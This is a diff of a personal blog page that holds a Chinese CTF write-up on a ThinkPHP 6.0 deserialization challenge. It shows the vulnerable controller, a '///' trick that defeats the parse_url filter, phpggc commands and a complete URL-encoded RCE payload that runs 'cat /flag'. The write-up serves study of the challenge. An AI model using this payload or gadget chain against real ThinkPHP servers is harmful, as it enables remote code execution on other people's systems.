@@ -316,43 +316,43 @@
     
     
     <p>www.zip源码泄露，Thinkphp6.0，代码在app/controller/Index.php</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
-<span style="color:#ff79c6">namespace</span> app\controller;
-<span style="color:#ff79c6">use</span> app\BaseController;
-
-<span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Index</span> <span style="color:#ff79c6">extends</span> BaseController
-{
-    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">index</span>()
-    {
-        
-        <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;img src=&#39;../test.jpg&#39;&#34;</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#34;/&gt;&#34;</span>;
-        <span style="color:#8be9fd;font-style:italic">$paylaod</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span><span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;payload&#39;</span>];
-        <span style="color:#ff79c6">if</span>(isset(<span style="color:#8be9fd;font-style:italic">$paylaod</span>))
-        {
-            <span style="color:#8be9fd;font-style:italic">$url</span> <span style="color:#ff79c6">=</span> parse_url(<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;REQUEST_URI&#39;</span>]);
-            parse_str(<span style="color:#8be9fd;font-style:italic">$url</span>[<span style="color:#f1fa8c">&#39;query&#39;</span>],<span style="color:#8be9fd;font-style:italic">$query</span>);
-            <span style="color:#ff79c6">foreach</span>(<span style="color:#8be9fd;font-style:italic">$query</span> <span style="color:#ff79c6">as</span> <span style="color:#8be9fd;font-style:italic">$value</span>)
-            {
-                <span style="color:#ff79c6">if</span>(preg_match(<span style="color:#f1fa8c">&#34;/^O/i&#34;</span>,<span style="color:#8be9fd;font-style:italic">$value</span>))
-                {
-                    <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#39;STOP HACKING&#39;</span>);
-                    <span style="color:#ff79c6">exit</span>();
-                }
-            }
-            unserialize(<span style="color:#8be9fd;font-style:italic">$paylaod</span>);
-        }
-    }
-}
-</code></pre></div><p>parse_url()</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">namespace</span> app\controller;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">use</span> app\BaseController;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Index</span> <span style="color:#ff79c6">extends</span> BaseController
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">index</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;img src=&#39;../test.jpg&#39;&#34;</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#34;/&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">$paylaod</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span><span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;payload&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(isset(<span style="color:#8be9fd;font-style:italic">$paylaod</span>))
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">$url</span> <span style="color:#ff79c6">=</span> parse_url(<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;REQUEST_URI&#39;</span>]);
+</span></span><span style="display:flex;"><span>            parse_str(<span style="color:#8be9fd;font-style:italic">$url</span>[<span style="color:#f1fa8c">&#39;query&#39;</span>],<span style="color:#8be9fd;font-style:italic">$query</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">foreach</span>(<span style="color:#8be9fd;font-style:italic">$query</span> <span style="color:#ff79c6">as</span> <span style="color:#8be9fd;font-style:italic">$value</span>)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span>(preg_match(<span style="color:#f1fa8c">&#34;/^O/i&#34;</span>,<span style="color:#8be9fd;font-style:italic">$value</span>))
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#39;STOP HACKING&#39;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">exit</span>();
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            unserialize(<span style="color:#8be9fd;font-style:italic">$paylaod</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>parse_url()</p>
 <p>1.//upload?如果是//，则被解析成host, 后面的内容如果有/,被解析出path，而不是query了</p>
 <p>2.如果path部分为///，则解析错误</p>
 <p>工具：https://github.com/wh1t3p1g/phpggc</p>
 <p>使用：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">./phpggc -l
-./phpggc -u ThinkPHP/RCE2  &#39;system(&#34;cat /flag&#34;);&#39;
-</code></pre></div><p>payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A200%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%220000000079ea1027000000003c8828b6%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>./phpggc -l
+</span></span><span style="display:flex;"><span>./phpggc -u ThinkPHP/RCE2  &#39;system(&#34;cat /flag&#34;);&#39;
+</span></span></code></pre></div><p>payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A200%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%220000000079ea1027000000003c8828b6%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D
+</span></span></code></pre></div>
 </section>
 
 
@@ -504,6 +504,8 @@
 
     
 
+    
+
 
 <script>
 (function(u, c) {
@@ -523,7 +525,7 @@
             2020 - 
         
         2022 <a href="https://stack-theme-mod.vercel.app/">茄子的养殖场</a>·<i class="fas fa-bell"></i> <a id="days">0</a>Days<br>
-      共书写了33.2k字·共 29篇文章</br><span><p>
+      共书写了33.5k字·共 30篇文章</br><span><p>
     </section>
     
     <section class="powerby">
@@ -667,7 +669,7 @@ document.getElementById('days').innerHTML = number_of_days;
         <div class="category-list">
             <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-list-link">学习笔记<span class="category-list-count">24</a>
             </span></div>
-            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%B0%8F%E4%BA%BA%E8%81%94%E5%90%88%E5%B7%A5%E4%BC%9A%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/" class="category-list-link">小人联合工会内部资料<span class="category-list-count">1</a>
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%B0%8F%E4%BA%BA%E8%81%94%E5%90%88%E5%B7%A5%E4%BC%9A%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/" class="category-list-link">小人联合工会内部资料<span class="category-list-count">2</a>
             </span></div>
             <div class="category-list-item"><a href="https://proben1.github.io/categories/%E6%95%B4%E7%82%B9%E5%B0%8F%E6%B4%BB/" class="category-list-link">整点小活<span class="category-list-count">4</a>
             </span></div>
